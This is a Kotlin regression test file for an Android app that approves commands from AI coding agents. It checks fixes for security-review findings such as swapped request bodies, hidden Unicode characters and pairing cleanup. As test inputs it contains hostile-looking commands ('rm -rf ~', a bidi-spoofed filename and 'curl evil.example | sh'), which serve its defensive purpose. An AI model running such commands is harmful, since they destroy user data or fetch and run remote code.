package dev.agentnest.app

import dev.agentnest.app.approval.ApprovalLogic
import dev.agentnest.app.approval.AuthAvailability
import dev.agentnest.app.approval.AuthOutcome
import dev.agentnest.app.approval.AuthRequest
import dev.agentnest.app.approval.AuthText
import dev.agentnest.app.approval.DecisionSubmitter
import dev.agentnest.app.approval.DenyKind
import dev.agentnest.app.approval.SubmitOutcome
import dev.agentnest.app.approval.UserAuthenticator
import dev.agentnest.app.data.NestRepository
import dev.agentnest.app.notify.AlertKind
import dev.agentnest.app.notify.NotificationTexts
import dev.agentnest.app.pairing.PairingController
import dev.agentnest.app.pairing.PairingUiState
import dev.agentnest.app.vault.VaultAction
import dev.agentnest.app.vault.VaultResult
import dev.agentnest.app.vault.VaultRetry
import dev.agentnest.core.approval.DecisionBlock
import dev.agentnest.core.crypto.B64
import dev.agentnest.core.crypto.PairingCrypto
import dev.agentnest.core.crypto.SpkiPin
import dev.agentnest.core.link.BackoffPolicy
import dev.agentnest.core.link.DeviceCredentials
import dev.agentnest.core.link.DeviceDescriptor
import dev.agentnest.core.link.HostBookState
import dev.agentnest.core.link.LinkClient
import dev.agentnest.core.link.LinkSideEffects
import dev.agentnest.core.link.SecurityAlertKind
import dev.agentnest.core.link.WsCallbacks
import dev.agentnest.core.link.WsConnection
import dev.agentnest.core.link.WsTransport
import dev.agentnest.core.protocol.AgentState
import dev.agentnest.core.protocol.ApprovalRequest
import dev.agentnest.core.protocol.AuthMethod
import dev.agentnest.core.protocol.ChallengeMessage
import dev.agentnest.core.protocol.ChallengePayload
import dev.agentnest.core.protocol.Codec
import dev.agentnest.core.protocol.DecodeResult
import dev.agentnest.core.protocol.Decision
import dev.agentnest.core.protocol.DecisionMessage
import dev.agentnest.core.protocol.EventKind
import dev.agentnest.core.protocol.ExtraConfirmationLevel
import dev.agentnest.core.protocol.PairPendingMessage
import dev.agentnest.core.protocol.PairPendingPayload
import dev.agentnest.core.protocol.PairResultMessage
import dev.agentnest.core.protocol.PairResultPayload
import dev.agentnest.core.protocol.QrParseResult
import dev.agentnest.core.protocol.QrPayload
import dev.agentnest.core.protocol.RiskLevel
import dev.agentnest.core.protocol.Ts
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.test.TestScope
import kotlinx.coroutines.test.advanceTimeBy
import kotlinx.coroutines.test.currentTime
import kotlinx.coroutines.test.runCurrent
import kotlinx.coroutines.test.runTest
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File
import java.io.IOException
import java.security.GeneralSecurityException
import java.security.ProviderException
import java.time.Clock
import java.time.Instant
import java.time.ZoneId
import java.time.ZoneOffset
import javax.crypto.AEADBadTagException

/**
 * Regression tests for the independent security review of the Android app (experiments E8-E10 asserted the buggy
 * behaviour; here the FIXED behaviour is asserted) plus one test per remaining finding that has testable logic.
 */
@OptIn(ExperimentalCoroutinesApi::class)
class ReviewRegressionTest {
    private val start: Instant = TD.T0

    private class FakeTransport : WsTransport {
        lateinit var callbacks: WsCallbacks
        val sent = ArrayList<String>()
        override fun open(host: String, port: Int, callbacks: WsCallbacks): WsConnection {
            this.callbacks = callbacks
            return object : WsConnection {
                override fun send(text: String): Boolean { sent += text; return true }
                override fun close(code: Int, reason: String) = Unit
                override fun cancel() = Unit
            }
        }
        fun decisions(): List<DecisionMessage> =
            sent.mapNotNull { (Codec.decode(it) as? DecodeResult.Decoded)?.message as? DecisionMessage }
    }

    private object NoEffects : LinkSideEffects {
        override fun persistHosts(hosts: HostBookState) = Unit
        override fun wipeDeviceToken() = Unit
        override fun wipePairing() = Unit
        override fun securityAlert(kind: SecurityAlertKind) = Unit
    }

    private fun TestScope.clock(): Clock = object : Clock() {
        override fun getZone(): ZoneId = ZoneOffset.UTC
        override fun withZone(zone: ZoneId?): Clock = this
        override fun instant(): Instant = start.plusMillis(testScheduler.currentTime)
    }

    private class Fixture(val transport: FakeTransport, val repo: NestRepository, val session: dev.agentnest.core.protocol.SessionState)

    private fun TestScope.connectedFixture(request: ApprovalRequest): Fixture {
        val transport = FakeTransport()
        val client = LinkClient(
            transport, HostBookState(qr = listOf("192.168.0.10")),
            { DeviceCredentials("dev_1", B64.encodeUrl(ByteArray(32) { it.toByte() })) },
            NoEffects, backgroundScope, clock(), backoff = BackoffPolicy(random = { 0.5 }), ids = { TD.id() },
        )
        val repo = NestRepository(backgroundScope, clock())
        repo.attach(client)
        client.start(true)
        runCurrent()
        transport.callbacks.onOpen()
        transport.callbacks.onText(Codec.encodeAny(ChallengeMessage(TD.meta(at = start), ChallengePayload("cXk4Z1l0d2VyN3U4aW9wMQ==", TD.PC.pcId, Ts.of(start), 5000))))
        transport.callbacks.onText(Codec.encodeAny(TD.welcome(at = start)))
        val session = TD.session("claude_code:s1", AgentState.AWAITING_APPROVAL, pending = listOf(request.requestId))
        transport.callbacks.onText(Codec.encodeAny(TD.snapshot(10, listOf(session), listOf(request), at = start)))
        runCurrent()
        return Fixture(transport, repo, session)
    }

    private fun benign() = TD.request(level = RiskLevel.LOW, extra = ExtraConfirmationLevel.NONE, command = "ls -la")

    // ---- E8 -------------------------------------------------------------------------------------------------------
    @Test
    fun `E8 a body swapped under the open biometric prompt is never decided`() = runTest {
        val benign = benign()
        val f = connectedFixture(benign)
        val evil = benign.copy(toolInputSha256 = "a".repeat(64), details = benign.details.copy(command = "rm -rf ~"))
        val shownToUser = ArrayList<String>()
        val auth = object : UserAuthenticator {
            override fun availability() = AuthAvailability.READY
            override suspend fun authenticate(request: AuthRequest): AuthOutcome {
                shownToUser += request.description
                f.transport.callbacks.onText(Codec.encodeAny(TD.snapshot(11, listOf(f.session), listOf(evil), at = start)))
                runCurrent()
                return AuthOutcome.Success(AuthMethod.BIOMETRIC, start)
            }
        }
        val outcome = DecisionSubmitter(f.repo, auth, clock = { start }).submit(benign.requestId, Decision.ALLOW, ExtraConfirmationLevel.NONE)
        assertEquals(SubmitOutcome.Blocked(DecisionBlock.BINDING_CHANGED), outcome)
        assertEquals("ls -la", shownToUser.single())
        assertTrue("nothing may leave the phone", f.transport.decisions().isEmpty())
        // the card stays on screen with the body the user saw, but locked
        val card = f.repo.nest.value.approvals.getValue(benign.requestId)
        assertEquals("ls -la", card.request!!.details.command)
        assertTrue(card.bindingConflict)
    }

    @Test
    fun `E8 a card removed and re-created with a new body under the prompt is never decided`() = runTest {
        val benign = benign()
        val f = connectedFixture(benign)
        val evil = benign.copy(nonceB64 = B64.encode(ByteArray(16) { 5 }), toolInputSha256 = "b".repeat(64), details = benign.details.copy(command = "rm -rf ~"))
        val auth = object : UserAuthenticator {
            override fun availability() = AuthAvailability.READY
            override suspend fun authenticate(request: AuthRequest): AuthOutcome {
                // snapshot 1 drops the card, snapshot 2 brings the same request_id back with another body
                f.transport.callbacks.onText(Codec.encodeAny(TD.snapshot(11, listOf(f.session), emptyList(), at = start)))
                f.transport.callbacks.onText(Codec.encodeAny(TD.snapshot(12, listOf(f.session), listOf(evil), at = start)))
                runCurrent()
                return AuthOutcome.Success(AuthMethod.BIOMETRIC, start)
            }
        }
        val outcome = DecisionSubmitter(f.repo, auth, clock = { start }).submit(benign.requestId, Decision.ALLOW, ExtraConfirmationLevel.NONE)
        assertEquals(SubmitOutcome.Blocked(DecisionBlock.BINDING_CHANGED), outcome)
        assertTrue(f.transport.decisions().isEmpty())
    }

    @Test
    fun `the unchanged card is still decided and echoes its own binding`() = runTest {
        val benign = benign()
        val f = connectedFixture(benign)
        val auth = object : UserAuthenticator {
            override fun availability() = AuthAvailability.READY
            override suspend fun authenticate(request: AuthRequest) = AuthOutcome.Success(AuthMethod.BIOMETRIC, start)
        }
        val outcome = DecisionSubmitter(f.repo, auth, clock = { start }).submit(benign.requestId, Decision.ALLOW, ExtraConfirmationLevel.NONE)
        assertEquals(SubmitOutcome.Sent, outcome)
        assertEquals(benign.toolInputSha256, f.transport.decisions().single().payload.toolInputSha256)
    }

    // ---- E9 -------------------------------------------------------------------------------------------------------
    @Test
    fun `E9 two concurrent submits for one card open exactly one prompt`() = runTest {
        val req = TD.request(level = RiskLevel.LOW, extra = ExtraConfirmationLevel.NONE)
        val f = connectedFixture(req)
        var prompts = 0
        val gate = CompletableDeferred<Unit>()
        val auth = object : UserAuthenticator {
            override fun availability() = AuthAvailability.READY
            override suspend fun authenticate(request: AuthRequest): AuthOutcome {
                prompts++
                gate.await()
                return AuthOutcome.Success(AuthMethod.BIOMETRIC, start)
            }
        }
        val results = ArrayList<SubmitOutcome>()
        // two DIFFERENT submitter instances (the controller creates one per call): the guard lives in the repository
        repeat(2) { backgroundScope.launch { results += DecisionSubmitter(f.repo, auth, clock = { start }).submit(req.requestId, Decision.ALLOW, ExtraConfirmationLevel.NONE) } }
        runCurrent()
        assertEquals(1, prompts)
        assertEquals(listOf<SubmitOutcome>(SubmitOutcome.Blocked(DecisionBlock.IN_FLIGHT)), results)
        gate.complete(Unit)
        runCurrent()
        assertEquals(1, f.transport.decisions().size)
        assertTrue(results.contains(SubmitOutcome.Sent))
        // the claim is released afterwards: a later attempt for another decision is possible again
        assertTrue(f.repo.beginDecision(req.requestId))
        f.repo.endDecision(req.requestId)
    }

    @Test
    fun `the single flight claim is released when the prompt is cancelled`() = runTest {
        val req = TD.request(level = RiskLevel.LOW, extra = ExtraConfirmationLevel.NONE)
        val f = connectedFixture(req)
        val auth = object : UserAuthenticator {
            override fun availability() = AuthAvailability.READY
            override suspend fun authenticate(request: AuthRequest): AuthOutcome = AuthOutcome.Cancelled
        }
        assertEquals(SubmitOutcome.AuthCancelled, DecisionSubmitter(f.repo, auth, clock = { start }).submit(req.requestId, Decision.ALLOW, ExtraConfirmationLevel.NONE))
        assertTrue(f.repo.beginDecision(req.requestId))
    }

    // ---- E10 / display sanitisation -----------------------------------------------------------------------------
    private val bidiCommand = "echo safe ‮txt.sh.evil‬​"

    @Test
    fun `E10 bidi and zero width characters are escaped in the biometric prompt text`() {
        val req = TD.request(command = bidiCommand)
        val d = AuthText.description(req)
        assertFalse(d.any { it == '‮' || it == '‬' || it == '​' })
        assertTrue(d.contains("⟨U+202E⟩"))
        assertTrue(d.contains("⟨U+200B⟩"))
        assertTrue("the prompt states how many hidden characters there are", d.contains("보이지 않는 문자 3개"))
        // an ordinary command is unchanged and has no warning line
        assertEquals("ls -la", AuthText.description(TD.request(command = "ls -la")))
    }

    @Test
    fun `the prompt text never cuts an escape in half`() {
        val cmd = "x".repeat(70) + "‮‮‮" + "tail"
        val d = AuthText.description(TD.request(command = cmd)).lineSequence().first()
        assertTrue(d.length <= 80)
        assertTrue(d.endsWith("…"))
        // every opening bracket has its closing one
        assertEquals(d.count { it == '⟨' }, d.count { it == '⟩' })
    }

    @Test
    fun `the prompt subtitle (card title) is sanitised too`() = runTest {
        val req = TD.request(level = RiskLevel.LOW, extra = ExtraConfirmationLevel.NONE).copy(title = "명령‮실행")
        val f = connectedFixture(req)
        var seen: AuthRequest? = null
        val auth = object : UserAuthenticator {
            override fun availability() = AuthAvailability.READY
            override suspend fun authenticate(request: AuthRequest): AuthOutcome {
                seen = request
                return AuthOutcome.Cancelled
            }
        }
        // the hidden character raises the gate to HOLD, so a submit without the hold is refused BEFORE any prompt ...
        assertEquals(
            SubmitOutcome.AuthCancelled,
            DecisionSubmitter(f.repo, auth, clock = { start }).submit(req.requestId, Decision.ALLOW, ExtraConfirmationLevel.HOLD),
        )
        assertEquals("명령⟨U+202E⟩실행", seen!!.subtitle)
    }

    @Test
    fun `hidden characters require at least the hold before an allow is sent`() = runTest {
        val req = TD.request(level = RiskLevel.LOW, extra = ExtraConfirmationLevel.NONE, command = bidiCommand)
        val f = connectedFixture(req)
        val auth = object : UserAuthenticator {
            override fun availability() = AuthAvailability.READY
            override suspend fun authenticate(request: AuthRequest) = AuthOutcome.Success(AuthMethod.BIOMETRIC, start)
        }
        val submitter = DecisionSubmitter(f.repo, auth, clock = { start })
        assertEquals(
            SubmitOutcome.Blocked(DecisionBlock.EXTRA_CONFIRMATION_REQUIRED),
            submitter.submit(req.requestId, Decision.ALLOW, ExtraConfirmationLevel.NONE),
        )
        assertTrue(f.transport.decisions().isEmpty())
        assertEquals(SubmitOutcome.Sent, submitter.submit(req.requestId, Decision.ALLOW, ExtraConfirmationLevel.HOLD))
        // a plain deny is never held back
        val f2 = connectedFixture(req)
        assertEquals(
            SubmitOutcome.Sent,
            DecisionSubmitter(f2.repo, auth, clock = { start }).submit(req.requestId, Decision.DENY, ExtraConfirmationLevel.NONE),
        )
    }

    // ---- 13: "거부 (중단)" -----------------------------------------------------------------------------------------
    @Test
    fun `without deny the stop is offered as the refusal and codex hooks get none`() {
        val both = TD.request()
        assertEquals(DenyKind.DENY, ApprovalLogic.denyKind(both))
        val stopOnly = TD.request(allowed = listOf(Decision.ALLOW, Decision.DENY_AND_STOP))
        assertEquals(DenyKind.DENY_AND_STOP_AS_DENY, ApprovalLogic.denyKind(stopOnly))
        assertEquals("거부 (중단)", dev.agentnest.app.ui.S.DENY_STOP_ONLY)
        val codexNoDeny = TD.request(allowed = listOf(Decision.ALLOW, Decision.DENY_AND_STOP), origin = "codex.hook.cli")
        assertEquals(DenyKind.NONE, ApprovalLogic.denyKind(codexNoDeny))
        val codexDeny = TD.request(allowed = listOf(Decision.ALLOW, Decision.DENY), origin = "codex.hook.cli")
        assertEquals(DenyKind.DENY, ApprovalLogic.denyKind(codexDeny))
    }

    // ---- 3: vault tri-state ---------------------------------------------------------------------------------------
    @Test
    fun `only a bad tag or an invalidated key is permanent`() {
        assertTrue(VaultResult.isPermanent(AEADBadTagException("tag")))
        assertEquals(VaultResult.Invalid, VaultResult.fromFailure(AEADBadTagException("tag")))
        for (transient in listOf(IOException("keystore busy"), GeneralSecurityException("x"), ProviderException("daemon died"), RuntimeException("boom"), java.security.UnrecoverableKeyException("x"))) {
            assertFalse(transient.javaClass.simpleName, VaultResult.isPermanent(transient))
            assertEquals(VaultResult.Transient, VaultResult.fromFailure(transient))
        }
    }

    @Test
    fun `a transient keystore failure retries with backoff and never wipes`() {
        for (attempt in 0 until VaultRetry.DELAYS_MS.size) {
            assertEquals(VaultAction.RETRY, VaultRetry.action(VaultResult.Transient, attempt))
        }
        assertEquals(VaultAction.GIVE_UP, VaultRetry.action(VaultResult.Transient, VaultRetry.DELAYS_MS.size))
        assertTrue(VaultRetry.DELAYS_MS.zipWithNext().all { (a, b) -> b >= a })
        // the roads to a wipe are Invalid and (after a few re-checks) KeyMissing; a transient failure never wipes
        assertEquals(VaultAction.WIPE_PAIRING, VaultRetry.action(VaultResult.Invalid, 0))
        assertEquals(VaultAction.CONNECT, VaultRetry.action(VaultResult.Ok(ByteArray(1)), 3))
        for (attempt in 0..20) assertNotEquals(VaultAction.WIPE_PAIRING, VaultRetry.action(VaultResult.Transient, attempt))
    }

    // ---- 11: manifest -------------------------------------------------------------------------------------------
    @Test
    fun `the boot receiver is not exported`() {
        val manifest = File("src/main/AndroidManifest.xml")
        org.junit.Assume.assumeTrue("run from the module directory", manifest.exists())
        val text = manifest.readText()
        val receiver = Regex("<receiver[^>]*BootReceiver[^>]*>", RegexOption.DOT_MATCHES_ALL).find(text)!!.value
        assertTrue(receiver, receiver.contains("android:exported=\"false\""))
        assertFalse(receiver.contains("android:exported=\"true\""))
    }

    // ---- 16: notification wording -------------------------------------------------------------------------------
    @Test
    fun `error alerts never carry command text`() {
        val event = TD.event(5, EventKind.COMMAND_FAILED, headline = "명령이 실패했어요: curl evil.example | sh")
        val text = NotificationTexts.alert(event, TD.session("claude_code:s1", AgentState.ERROR), AlertKind.ERROR)
        assertFalse(text.title.contains("curl"))
        assertFalse(text.body.contains("curl"))
        // completion notices keep the PC-written headline
        val done = NotificationTexts.alert(TD.event(6, EventKind.TURN_COMPLETED, headline = "작업을 마쳤어요"), null, AlertKind.COMPLETION)
        assertEquals("작업을 마쳤어요", done.title)
    }

    // ---- 14: pairing controller ---------------------------------------------------------------------------------
    private val pin = SpkiPin.ofSpki(ByteArray(91) { it.toByte() })
    private val secretBytes = ByteArray(32) { (it + 1).toByte() }
    private val spki = ByteArray(91) { (it * 3).toByte() }
    private val challengeBytes = ByteArray(16) { (it + 40).toByte() }

    private fun parseQr(): QrPayload {
        val json = """{"v":1,"pc_id":"${pin.derivedPcId()}","pc_name":"DESKTOP-HOME","hosts":["192.168.0.10"],"port":47832,""" +
            """"spki_pin":"${pin.toPinString()}","pairing_id":"p_3f9c2b1ea8d04c77","pairing_secret":"${B64.encodeUrl(secretBytes)}",""" +
            """"expires_at":"2026-10-15T12:02:00Z"}"""
        return (QrPayload.parse(QrPayload.URI_PREFIX + B64.encodeUrl(json.toByteArray(Charsets.UTF_8)), start) as QrParseResult.Success).payload
    }

    private class Harness(val transport: FakeTransport) {
        val persistStarted = ArrayList<String>()
        val persisted = ArrayList<String>()
        val rolledBack = ArrayList<String>()
        val shutdowns = ArrayList<WsTransport>()
        var failPersist = false
        var persistDelayMs = 0L
        var started = 0
    }

    private fun TestScope.controller(h: Harness): PairingController = PairingController(
        scope = backgroundScope,
        transportFactory = { h.transport },
        devicePublicKey = { spki },
        device = { DeviceDescriptor("Pixel") },
        persist = { result ->
            h.persistStarted += result.deviceId
            delay(h.persistDelayMs)
            if (h.failPersist) throw IllegalStateException("keystore")
            h.persisted += result.deviceId
        },
        onPersisted = { h.started++ },
        rollback = { h.rolledBack += "rolled back" },
        transportShutdown = { h.shutdowns += it },
        shutdownGraceMs = 2_000,
    )

    private fun TestScope.driveToCompleted(h: Harness, c: PairingController) {
        c.begin(parseQr())
        runCurrent()
        val callbacks = h.transport.callbacks
        callbacks.onText(Codec.encodeAny(ChallengeMessage(TD.meta(at = start), ChallengePayload(B64.encode(challengeBytes), pin.derivedPcId(), Ts.of(start), 5000))))
        runCurrent()
        val sas = PairingCrypto.sas(parseQr().secret, challengeBytes, spki)
        callbacks.onText(Codec.encodeAny(PairPendingMessage(TD.meta(at = start), PairPendingPayload("p_3f9c2b1ea8d04c77", sas, 60_000))))
        runCurrent()
        val result = PairResultPayload(true, "dev_9", B64.encodeUrl(ByteArray(32) { 9 }), TD.PC.copy(pcId = pin.derivedPcId()), null)
        callbacks.onText(Codec.encodeAny(PairResultMessage(TD.meta(at = start), result)))
    }

    @Test
    fun `the pairing transport is shut down after completion`() = runTest {
        val h = Harness(FakeTransport())
        val c = controller(h)
        driveToCompleted(h, c)
        runCurrent()
        assertEquals(PairingUiState.Done, c.state.value)
        assertTrue("not before the grace period", h.shutdowns.isEmpty())
        advanceTimeBy(2_500)
        runCurrent()
        assertEquals(listOf<WsTransport>(h.transport), h.shutdowns)
    }

    @Test
    fun `the pairing transport is shut down after a failure and after cancel`() = runTest {
        val failed = Harness(FakeTransport())
        val c1 = controller(failed)
        c1.begin(parseQr())
        runCurrent()
        failed.transport.callbacks.onFailure(dev.agentnest.core.link.TransportFailure(dev.agentnest.core.link.TransportFailureKind.UNREACHABLE, "x"))
        runCurrent()
        assertTrue(c1.state.value is PairingUiState.Failed)
        advanceTimeBy(2_500)
        runCurrent()
        assertEquals(1, failed.shutdowns.size)

        val cancelled = Harness(FakeTransport())
        val c2 = controller(cancelled)
        c2.begin(parseQr())
        runCurrent()
        c2.cancel()
        runCurrent()
        advanceTimeBy(2_500)
        runCurrent()
        assertEquals(1, cancelled.shutdowns.size)
        // a second cancel does not shut it down twice
        c2.cancel()
        advanceTimeBy(5_000)
        runCurrent()
        assertEquals(1, cancelled.shutdowns.size)
    }

    @Test
    fun `cancel while saving does not interrupt the persist`() = runTest {
        val h = Harness(FakeTransport()).also { it.persistDelayMs = 1_000 }
        val c = controller(h)
        driveToCompleted(h, c)
        runCurrent()
        assertEquals(PairingUiState.Saving, c.state.value)
        assertEquals(listOf("dev_9"), h.persistStarted)
        c.cancel() // the user leaves the screen while the token is being stored
        runCurrent()
        assertEquals(PairingUiState.Saving, c.state.value)
        advanceTimeBy(1_500)
        runCurrent()
        assertEquals(listOf("dev_9"), h.persisted)
        assertEquals(PairingUiState.Done, c.state.value)
        assertEquals(1, h.started)
        assertTrue(h.rolledBack.isEmpty())
    }

    @Test
    fun `a failing persist rolls back and reports an error`() = runTest {
        val h = Harness(FakeTransport()).also { it.failPersist = true }
        val c = controller(h)
        driveToCompleted(h, c)
        runCurrent()
        assertTrue(c.state.value is PairingUiState.Failed)
        assertEquals(1, h.rolledBack.size)
        assertEquals(0, h.started)
        advanceTimeBy(2_500)
        runCurrent()
        assertEquals(1, h.shutdowns.size)
    }
}
